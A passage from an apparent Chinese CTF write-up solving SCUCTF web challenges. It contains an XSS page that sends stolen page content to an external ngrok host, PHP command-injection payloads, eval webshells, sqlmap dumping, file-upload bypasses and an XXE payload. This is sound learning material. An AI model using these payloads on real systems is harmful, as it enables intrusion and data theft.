<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="comment"># 随机长度大小</span></span><br><span class="line">    rand_int = <span class="built_in">len</span>(name)</span><br><span class="line">    data = &#123;<span class="string">&#x27;len&#x27;</span>:rand_int,<span class="string">&#x27;code&#x27;</span>:<span class="number">200</span>&#125;</span><br><span class="line">    response = make_response(data)</span><br><span class="line"></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    response.status_code = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect_url</span>():</span><br><span class="line">    ref = request.referrer</span><br><span class="line">    refhost = urllib.parse.urlparse(ref).netloc</span><br><span class="line">    host = request.host</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(host) != <span class="built_in">str</span>(refhost):</span><br><span class="line">        response = make_response(<span class="string">&#x27;this is forbidden&#x27;</span>)</span><br><span class="line">        response.status_code = <span class="number">404</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">if</span> refhost <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No URL provided.&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> redirect(ref+<span class="string">&quot;success&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Success!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/steal-data&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">steal</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;data&#x27;</span>:data&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/js&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">js_route</span>():</span><br><span class="line">    html_code=\</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;&lt;!-- 攻击者的恶意网页 --&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;XSS Attack&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;XSS Attack&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;script nonce=&#x27;XssFun&#x27;&gt;</span></span><br><span class="line"><span class="string">        // 攻击代码</span></span><br><span class="line"><span class="string">        &#123;#alert(0);#&#125;</span></span><br><span class="line"><span class="string">        const targetPageUrl = &#x27;/flag&#x27;;  // 目标页面的URL</span></span><br><span class="line"><span class="string">        const maliciousHost = &#x27;https://4e57-211-83-126-124.ngrok-free.app/&#x27;;  // 恶意主机的URL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // 创建一个隐藏的iframe</span></span><br><span class="line"><span class="string">        const iframe = document.createElement(&#x27;iframe&#x27;);</span></span><br><span class="line"><span class="string">        iframe.style.display = &#x27;none&#x27;;</span></span><br><span class="line"><span class="string">        document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // 加载目标页面到iframe中</span></span><br><span class="line"><span class="string">        iframe.src = targetPageUrl;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // 等待iframe加载完成</span></span><br><span class="line"><span class="string">        iframe.onload = function() &#123;</span></span><br><span class="line"><span class="string">            // 从iframe中读取目标页面的内容</span></span><br><span class="line"><span class="string">            const targetPageContent = iframe.contentDocument.documentElement.outerHTML;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // 构建URL，将目标页面的内容作为查询参数传递</span></span><br><span class="line"><span class="string">            const url = `$&#123;maliciousHost&#125;/steal-data?data=$&#123;encodeURIComponent(targetPageContent)&#125;`;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            // 通过设置window.location.href实现GET请求</span></span><br><span class="line"><span class="string">            window.location.href = url;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_code)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>看起来就是命令执行，需要绕过一个<code>die</code>，以及有<code>waf</code>，<code>+</code>被过滤了，就用<code>-</code>。</p>
<p>构造payload<br><code>/?name=&quot;-highlight_file(&#39;flag.php&#39;)-&quot;</code></p>
<p>查看<code>/cache.php</code>，发现函数被正常执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: highlight_file(flag.php): Failed to open stream: No such file or directory in /var/www/html/cache.php on line 1</span><br><span class="line"></span><br><span class="line">Warning: highlight_file(): Failed opening &#x27;flag.php&#x27; for highlighting in /var/www/html/cache.php on line 1</span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught TypeError: Unsupported operand types: string - bool in /var/www/html/cache.php:1 Stack trace: #0 &#123;main&#125; thrown in /var/www/html/cache.php on line 1</span><br></pre></td></tr></table></figure>

<p>直接<code>print(system(&quot;ls /&quot;))</code></p>
<p>回到<code>/cache.php</code>，发现根目录下有文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Th1s_1s_f14g bin dev etc home init.sh lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>直接查看<code>Th1s_1s_f14g</code>即可</p>
<p><code>?name=&quot;-print(system(&quot;cat /Th1s_1s_f14g &quot;))-&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;f95b303c-4863-4413-a26a-c2616910a6d7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h3><p>sqlmap 一把梭，发现能注入，但是数据库里没flag？</p>
<h4 id="错误的尝试"><a href="#错误的尝试" class="headerlink" title="错误的尝试"></a>错误的尝试</h4><p>在那个ctf库里，flag的值为“Where_is_Flag”？</p>
<p>那么重新试一下。尝试写马。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>attack<span class="string">&#x27;]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>–os-shell没权限，写不了。换成–sql-shell，没有看日志的权限（也许是我弄错了），不知道绝对路径，也写不了马（也没有权限写），也不是dba。</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upstream-yu/p/15185494.html">查找资料</a>，information_schema.routines表提供了关于数据库中存储过程和存储函数的信息。尝试用sqlmap把其dump出来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://223.129.86.2:33457/?<span class="built_in">id</span>=1 -D information_schema -T ROUTINES --dump</span><br></pre></td></tr></table></figure>

<p>输出结果很多，还好sqlmap自动dump到csv文件里了。打开那个csv文件，全局搜索“flag”，也许会找到相关的信息，没想到flag直接就出来了。</p>
<p>该行csv信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/12/3 10:10	char(50)	&lt;blank&gt;	&lt;blank&gt;	char	SQL	getFlag	getFlag	ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION	2023/12/3 10:10	&lt;blank&gt;	&lt;blank&gt;	&lt;blank&gt;	utf8mb4_0900_ai_ci	SQL	CONTAINS SQL	return &quot;scuctf&#123;9f333906-b203-4bd5-bb53-ab296aab869f&#125;&quot;	ctf	FUNCTION	&lt;blank&gt;	SQL	YES	def	utf8mb4	utf8mb4_0900_ai_ci	root@localhost	DEFINER	latin1	latin1_swedish_ci	200	50	</span><br></pre></td></tr></table></figure>

<p>再次尝试用sqlmap获取sql-shell，然后运行一下getFlag()函数，果然得到了flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[18:27:24] [INFO] calling MySQL shell. To quit <span class="built_in">type</span> <span class="string">&#x27;x&#x27;</span> or <span class="string">&#x27;q&#x27;</span> and press ENTER</span><br><span class="line">sql-shell&gt; getFlag();</span><br><span class="line">[18:27:30] [INFO] fetching SQL query output: <span class="string">&#x27;getFlag()&#x27;</span></span><br><span class="line">getFlag(): <span class="string">&#x27;scuctf&#123;9f333906-b203-4bd5-bb53-ab296aab869f&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>这个php文件上传的时候只查后缀名，而且还是黑名单，所以上传的时候把文件名改成xx.pHP就能绕过。（大小写绕过），然后，文件名是以一个时间名来存储的。所以我们只要在上传的时候获取当时的时间戳就能定位到文件。</p>
<p>我是这样做的：先上传恶意文件1.pHP，再点击提交前的一瞬间运行这个php脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="string">&quot;.pHP&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;America/Los_Angeles&#x27;</span>);</span><br><span class="line"><span class="variable">$img_path</span> = <span class="string">&#x27;upload&#x27;</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;His&quot;</span>).<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img_path</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="几次尝试"><a href="#几次尝试" class="headerlink" title="几次尝试"></a>几次尝试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">env</span>()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [HOSTNAME] =&gt; 40b309399995 [PHP_VERSION] =&gt; 8.3.0 [APACHE_CONFDIR] =&gt; /etc/apache2 [PHP_INI_DIR] =&gt; /usr/local/etc/php [GPG_KEYS] =&gt; 1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA [PHP_LDFLAGS] =&gt; -Wl,-O1 -pie [PWD] =&gt; /var/www/html [APACHE_LOG_DIR] =&gt; /var/log/apache2 [LANG] =&gt; C [PHP_SHA256] =&gt; 1db84fec57125aa93638b51bb2b15103e12ac196e2f960f0d124275b2687ea54 [APACHE_PID_FILE] =&gt; /var/run/apache2/apache2.pid [PHPIZE_DEPS] =&gt; autoconf dpkg-dev file g++ gcc libc-dev make pkg-config re2c [PHP_URL] =&gt; https://www.php.net/distributions/php-8.3.0.tar.xz [APACHE_RUN_GROUP] =&gt; www-data [APACHE_LOCK_DIR] =&gt; /var/lock/apache2 [SHLVL] =&gt; 0 [PHP_CFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 [APACHE_RUN_DIR] =&gt; /var/run/apache2 [APACHE_ENVVARS] =&gt; /etc/apache2/envvars [APACHE_RUN_USER] =&gt; www-data [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [PHP_ASC_URL] =&gt; https://www.php.net/distributions/php-8.3.0.tar.xz.asc [PHP_CPPFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 )</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读上层文件，没有flag</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))))[<span class="number">1</span>])); <span class="meta">?&gt;</span></span><br><span class="line">&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; html )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一步步看，全没flag</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>()); <span class="meta">?&gt;</span></span><br><span class="line">&gt; /<span class="keyword">var</span>/www/html/upload</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())); <span class="meta">?&gt;</span></span><br><span class="line">&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; <span class="number">211001</span>.php [<span class="number">3</span>] =&gt; <span class="number">211037</span>.php [<span class="number">4</span>] =&gt; <span class="number">211218</span>.php [<span class="number">5</span>] =&gt; <span class="number">211308</span>.php [<span class="number">6</span>] =&gt; <span class="number">211656</span>.php [<span class="number">7</span>] =&gt; <span class="number">211927</span>.php [<span class="number">8</span>] =&gt; <span class="number">212132</span>.php [<span class="number">9</span>] =&gt; <span class="number">212204</span>.php [<span class="number">10</span>] =&gt; <span class="number">212210</span>.php [<span class="number">11</span>] =&gt; <span class="number">212219</span>.php [<span class="number">12</span>] =&gt; <span class="number">212922</span>.php [<span class="number">13</span>] =&gt; <span class="number">213058</span>.php [<span class="number">14</span>] =&gt; <span class="number">213205</span>.php )</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="meta">?&gt;</span></span><br><span class="line">&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; index.php [<span class="number">3</span>] =&gt; upload )</span><br></pre></td></tr></table></figure>

<h4 id="解法1：尝试把php命令执行代码写到headers里"><a href="#解法1：尝试把php命令执行代码写到headers里" class="headerlink" title="解法1：尝试把php命令执行代码写到headers里"></a>解法1：尝试把php命令执行代码写到headers里</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>burp抓包，然后在headers里加东西就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/220009.php HTTP/1.1</span><br><span class="line">... headers ...</span><br><span class="line">Content-Length: 0</span><br><span class="line">X: system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
<p>然后就可以看了，首先ls下根目录，返回如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 04 Dec 2023 06:02:39 GMT</span><br><span class="line">Server: Apache/2.4.57 (Debian)</span><br><span class="line">X-Powered-By: PHP/8.3.0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 236</span><br><span class="line"></span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Only variables should be passed by reference in &lt;b&gt;/var/www/html/upload/220009.php&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
<p><strong>这个Notice，也就是Notice: Only variables should be passed by reference这个，完全只是Notice，居然不影响函数传值，在这里浪费了很多时间。</strong></p>
<p>然后就cat &#x2F;flag就行了。</p>
<p>SCUCTF{25ee1d72-aa8b-4591-b473-c3eb7638dbf8}</p>
<h4 id="解法2：尝试把php命令执行代码命令写到get参数里"><a href="#解法2：尝试把php命令执行代码命令写到get参数里" class="headerlink" title="解法2：尝试把php命令执行代码命令写到get参数里"></a>解法2：尝试把php命令执行代码命令写到get参数里</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://2xxxxxx2:33643/upload/XXXXX.php?a=system">http://2XXXXXX2:33643/upload/XXXXX.php?a=system</a>(‘cat &#x2F;flag’);</p>
<p>也能弄出来，但奇怪的是，分明有过滤下划线，但是这里是有下划线的，为什么还能上传？</p>
<h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>一个主机检测的页面。直接输入127.0.0.1或者localhost之类的内容进到文本框里，直接说是Hacker，waf挡住了127.0.0.1和localhost。查看源代码，发现有提示，“xxe.php”。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box_3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xxe.php --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content11&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开xxe.php，出现源码。</p>
<p>首先，它检查请求是否来自于本地主机，即127.0.0.1，如果是本地主机才会接着放行。</p>
<p>接下来的代码会执行xxe。具体看注释。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);  <span class="comment">//  启用实体加载，代表在后面的xml处理中可以加载外部实体</span></span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// 通过php://input接受内容（这里的逻辑是接受一个XML文档），这里的内容是通过POST传递的。</span></span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;http&quot;</span> ,<span class="string">&quot;&amp;#&quot;</span>); <span class="comment">// 黑名单</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$black</span>) &#123; <span class="comment">// 如果接受的XML中含有黑名单词汇则die掉</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$xmlfile</span>, <span class="variable">$black</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t trick Me!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>(); <span class="comment">// 创建一个DOMDocument对象</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">// 加载XML文件内容</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">// 把XML内容转换为SimpleXMLElement</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$info</span>-&gt;name; <span class="comment">// 从XML中提取name元素的值，并将其输出。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题意应该是构造XXE攻击，但是需要从进行SSRF。index里是一个“主机存活检测”，可以输入一个页面，然后其会访问，访问后返回那个页面的内容。那就可以从&#x2F;index发送一个访问&#x2F;xxe.php的包，内含XXE的payload。</p>
<h4 id="构造XXE"><a href="#构造XXE" class="headerlink" title="构造XXE"></a>构造XXE</h4><p>可以根据教程构造如下的XXE payload。首先定义xml版本和字符编码，然后在DOCTYPE中定义实体，这里定义一个xxe实体，其内容是通过”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag”来读取的。</p>
<p>“php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;“是PHP的一种过滤器，用于对文件内容进行base64编码。用这个过滤器而不用file:&#x2F;&#x2F;的原因是&#x2F;xxe.php会过滤file关键字。</p>
<p>XML文档的主体包含一个名为 “root” 的元素，其中包含一个名为 “name” 的元素。在 “name” 元素中使用了先前定义的 “xxe” 实体引用。用name的原因是&#x2F;xxe.php会读name元素里的内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当这个Payload被发送到一个使用不安全的XML解析器的目标服务器时，解析器可能会解析并展开实体引用，导致它读取 &#x2F;flag 文件的内容并将其以Base64编码的形式嵌入到XML文档中。</p>
<h4 id="构造SSRF：Gopher"><a href="#构造SSRF：Gopher" class="headerlink" title="构造SSRF：Gopher"></a>构造SSRF：Gopher</h4><p>index只能输入一个url，但是需要传XXE的内容到&#x2F;xxe.php去，php:&#x2F;&#x2F;input接受的又是post请求的内容，那么HTTP-GET和HTTP-POST肯定是不行的。前者发不了内容，后者不能精简到一个uri。</p>
